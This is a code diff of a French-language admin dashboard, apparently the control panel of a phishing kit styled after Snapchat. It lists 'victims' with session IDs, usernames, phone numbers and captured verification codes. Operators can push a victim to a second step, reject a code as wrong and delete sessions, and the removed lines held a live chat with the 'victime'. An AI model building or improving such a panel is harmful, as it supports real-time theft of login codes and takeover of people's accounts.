@@ -7,165 +7,31 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
 
-        body {
-            margin: 0;
-            padding: 0;
-            background: #0a0a0a;
-            color: #fff;
-            font-family: 'Inter', sans-serif;
-            min-height: 100vh;
-        }
+        body { margin:0; padding:0; background:#0a0a0a; color:#fff; font-family:'Inter',sans-serif; min-height:100vh; }
 
-        .login-container {
-            max-width: 420px;
-            margin: 120px auto;
-            padding: 40px 30px;
-            background: #1a1a1a;
-            border-radius: 16px;
-            text-align: center;
-            border: 1px solid #333;
-        }
-        .login-container h1 { color: #FFFC00; }
-        input[type="password"] {
-            width: 100%;
-            padding: 16px;
-            background: #111;
-            border: 1px solid #444;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 18px;
-            margin: 20px 0;
-        }
+        .login-container { max-width:420px; margin:120px auto; padding:40px; background:#1a1a1a; border-radius:16px; text-align:center; border:1px solid #333; }
+        .login-container h1 { color:#FFFC00; }
+        input[type="password"] { width:100%; padding:16px; background:#111; border:1px solid #444; border-radius:12px; color:#fff; font-size:18px; margin:20px 0; }
         button { background:#FFFC00; color:#000; font-weight:600; padding:14px; border:none; border-radius:12px; cursor:pointer; width:100%; font-size:16px; }
 
-        .header {
-            background: #111;
-            padding: 20px 30px;
-            border-bottom: 1px solid #333;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
+        .header { background:#111; padding:20px 30px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center; }
+        .container { max-width:1200px; margin:30px auto; padding:0 20px; }
+        input#filter { width:100%; padding:14px; background:#1a1a1a; border:1px solid #333; border-radius:12px; color:#fff; margin-bottom:20px; font-size:16px; }
 
-        .container {
-            max-width: 1200px;
-            margin: 30px auto;
-            padding: 0 20px;
-        }
+        table { width:100%; border-collapse:collapse; background:#1a1a1a; border-radius:12px; overflow:hidden; }
+        th, td { padding:16px 20px; text-align:left; border-bottom:1px solid #333; }
+        th { background:#222; color:#FFFC00; }
+        tr:hover { background:#252525; }
 
-        input#filter {
-            width: 100%;
-            padding: 14px;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 12px;
-            color: #fff;
-            margin-bottom: 20px;
-            font-size: 16px;
-        }
+        .status { padding:6px 14px; border-radius:20px; font-size:14px; font-weight:600; }
+        .waiting { background:#8B0000; color:#fff; }
+        .code_received { background:#006400; color:#fff; }
+        .step2_forced { background:#FF8800; color:#000; }
 
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            background: #1a1a1a;
-            border-radius: 12px;
-            overflow: hidden;
-        }
-
-        th, td {
-            padding: 16px 20px;
-            text-align: left;
-            border-bottom: 1px solid #333;
-        }
-
-        th {
-            background: #222;
-            color: #FFFC00;
-        }
-
-        tr:hover {
-            background: #252525;
-        }
-
-        .status {
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        .waiting { background: #8B0000; color: #fff; }
-        .code_received { background: #006400; color: #fff; }
-        .step2_forced { background: #FF8800; color: #000; }
-
-        .actions {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-
-        .action-btn {
-            padding: 8px 14px;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            border: none;
-            font-size: 13px;
-        }
-
-        .step2-btn { background: #FF8800; color: #000; }
-        .delete-btn { background: #FF0000; color: #fff; font-size: 16px; min-width: 40px; }
-
-        #adminChat {
-            margin-top: 20px;
-            background: #1a1a1a;
-            border-radius: 12px;
-            padding: 15px;
-            height: 300px;
-            display: none;
-            flex-direction: column;
-        }
-
-        #chatMessagesAdmin {
-            flex: 1;
-            overflow-y: auto;
-            padding: 10px;
-            background: #111;
-            border-radius: 8px;
-        }
-
-        .chat-msg-admin {
-            margin: 6px 0;
-            padding: 8px 12px;
-            border-radius: 8px;
-        }
-
-        .chat-victim { background: #FFFC00; color: #000; }
-        .chat-admin { background: #333; color: #fff; }
-
-        #adminChatInput {
-            display: flex;
-            gap: 8px;
-            margin-top: 10px;
-        }
-
-        #adminChatInput input {
-            flex: 1;
-            padding: 10px;
-            background: #222;
-            border: 1px solid #444;
-            color: #fff;
-            border-radius: 8px;
-        }
-
-        .chat-legend {
-            font-size: 13px;
-            color: #aaa;
-            margin: 8px 0 12px 0;
-            padding: 6px 10px;
-            background: #222;
-            border-radius: 6px;
-        }
+        .actions { display:flex; gap:8px; flex-wrap:wrap; }
+        .action-btn { padding:8px 14px; border-radius:8px; font-weight:600; cursor:pointer; border:none; font-size:13px; }
+        .step2-btn { background:#FF8800; color:#000; }
+        .delete-btn { background:#FF0000; color:#fff; font-size:16px; min-width:40px; }
     </style>
 </head>
 <body>
@@ -189,7 +55,7 @@
         </div>
 
         <div class="container">
-            <input type="text" id="filter" placeholder="Filtrer par Session ID, Username ou Téléphone...">
+            <input type="text" id="filter" placeholder="Filtrer...">
 
             <table id="victimsTable">
                 <thead>
@@ -205,59 +71,43 @@
                 </thead>
                 <tbody></tbody>
             </table>
-
-            <div id="adminChat">
-                <h3>Chat avec <span id="chatVictimId"></span></h3>
-                <div class="chat-legend">🟡 Jaune = Victime | Gris = Admin</div>
-                <div id="chatMessagesAdmin"></div>
-                <div id="adminChatInput">
-                    <input type="text" id="adminMessage" placeholder="Répondre à la victime...">
-                    <button onclick="sendAdminMessage()">Envoyer</button>
-                </div>
-            </div>
         </div>
     </div>
 
     <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
     <script>
-        const PASSWORD = "changeMoi123"; // CHANGE ÇA IMMÉDIATEMENT
+        const PASSWORD = "changeMoi123"; // ← CHANGE ÇA
 
         let victims = [];
-        let currentChatSession = null;
-        let socket = null;
 
         function login() {
             if (document.getElementById('adminPass').value.trim() === PASSWORD) {
                 document.getElementById('loginScreen').style.display = 'none';
                 document.getElementById('mainPanel').style.display = 'block';
-                initPanel();
+                startPanel();
             } else {
                 const err = document.getElementById('error');
                 err.style.display = 'block';
-                setTimeout(() => err.style.display = 'none', 2500);
+                setTimeout(() => err.style.display = 'none', 3000);
             }
         }
 
-        function initPanel() {
-            socket = io();
-
-            socket.on('connect', () => console.log('✅ Connecté'));
+        function startPanel() {
+            const socket = io();
 
             async function loadVictims() {
                 try {
                     const res = await fetch('/api/victims');
-                    victims = await res.json();
+                    victims = await res.json() || [];
                     renderTable();
-                } catch(e) {}
+                } catch(e) { console.error(e); }
             }
 
             function renderTable() {
                 const tbody = document.querySelector('#victimsTable tbody');
                 tbody.innerHTML = '';
-                let count = 0;
 
                 victims.forEach(v => {
-                    count++;
                     const row = document.createElement('tr');
                     row.innerHTML = `
                         <td><code>${v.sessionId || '-'}</code></td>
@@ -268,7 +118,6 @@
                         <td><strong>${v.code || '-'}</strong></td>
                         <td class="actions">
                             <button class="action-btn step2-btn" onclick="forceStep2('${v.sessionId}')">▶️ Étape 2</button>
-                            <button class="action-btn" onclick="toggleChat('${v.sessionId}')" style="background:#00C853;color:#000;">💬 Chat</button>
                             <button class="action-btn" onclick="badCode('${v.sessionId}')" style="background:#FF4444;color:#fff;">Code mauvais</button>
                             <button class="action-btn delete-btn" onclick="deleteSession('${v.sessionId}', this)">❌</button>
                         </td>
@@ -276,72 +125,49 @@
                     tbody.appendChild(row);
                 });
 
-                document.getElementById('liveCount').textContent = count;
+                document.getElementById('liveCount').textContent = victims.length;
             }
 
-            window.forceStep2 = async (sessionId) => {
-                await fetch('/api/force-step2', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sessionId})});
+            // Boutons globaux
+            window.forceStep2 = async function(sessionId) {
+                await fetch('/api/force-step2', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({sessionId})
+                });
                 loadVictims();
             };
 
-            window.badCode = async (sessionId) => {
-                await fetch('/api/bad-code', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sessionId})});
+            window.badCode = async function(sessionId) {
+                await fetch('/api/bad-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({sessionId})
+                });
                 loadVictims();
             };
 
-            window.deleteSession = async (sessionId, btn) => {
+            window.deleteSession = function(sessionId, btn) {
                 if (!confirm(`Supprimer ${sessionId} ?`)) return;
                 btn.closest('tr').remove();
-                document.getElementById('liveCount').textContent = Math.max(0, parseInt(document.getElementById('liveCount').textContent) - 1);
-                try {
-                    await fetch('/api/delete-session', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sessionId})});
-                } catch(e){}
+                document.getElementById('liveCount').textContent = Math.max(0, victims.length - 1);
+                fetch('/api/delete-session', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({sessionId})
+                });
             };
 
-            window.toggleChat = (sessionId) => {
-                const panel = document.getElementById('adminChat');
-                if (currentChatSession === sessionId && panel.style.display === 'flex') {
-                    panel.style.display = 'none';
-                    currentChatSession = null;
-                } else {
-                    currentChatSession = sessionId;
-                    panel.style.display = 'flex';
-                    document.getElementById('chatVictimId').textContent = sessionId;
-                    document.getElementById('chatMessagesAdmin').innerHTML = '';
-                    if (socket) socket.emit('joinSession', sessionId);
-                }
-            };
-
-            window.sendAdminMessage = () => {
-                const input = document.getElementById('adminMessage');
-                const msg = input.value.trim();
-                if (!msg || !currentChatSession) return;
-                socket.emit('chatMessage', {sessionId: currentChatSession, message: msg, from: 'admin'});
-                const container = document.getElementById('chatMessagesAdmin');
-                const div = document.createElement('div');
-                div.className = 'chat-msg-admin chat-admin';
-                div.textContent = msg;
-                container.appendChild(div);
-                container.scrollTop = container.scrollHeight;
-                input.value = '';
-            };
-
-            // Filter
-            document.getElementById('filter').addEventListener('input', () => {
-                // Simple re-render on filter (full reload for simplicity)
-                loadVictims();
-            });
-
-            setInterval(loadVictims, 2000);
+            // Chargement
+            setInterval(loadVictims, 2500);
             loadVictims();
         }
 
-        // Login Enter key
+        // Login Enter
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('adminPass').addEventListener('keypress', e => {
-                if (e.key === 'Enter') login();
-            });
-            document.getElementById('adminPass').focus();
+            const input = document.getElementById('adminPass');
+            input.focus();
+            input.addEventListener('keypress', e => { if (e.key === "Enter") login(); });
         });
     </script>
 </body>
